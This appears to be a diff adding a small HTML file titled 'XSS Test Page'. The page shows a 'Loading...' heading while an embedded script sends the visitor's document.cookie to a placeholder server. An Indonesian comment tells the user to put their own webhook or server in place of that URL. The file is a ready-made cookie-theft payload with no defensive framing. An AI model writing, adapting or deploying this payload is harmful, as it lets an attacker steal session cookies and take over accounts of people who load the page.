@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>XSS Test Page</title>
+</head>
+<body>
+
+<h2>Loading...</h2>
+
+<script>
+  // GANTI URL DI BAWAH INI dengan webhook / server kamu
+  fetch("https://your-server.com/?cookie=" + document.cookie);
+</script>
+
+</body>
+</html>
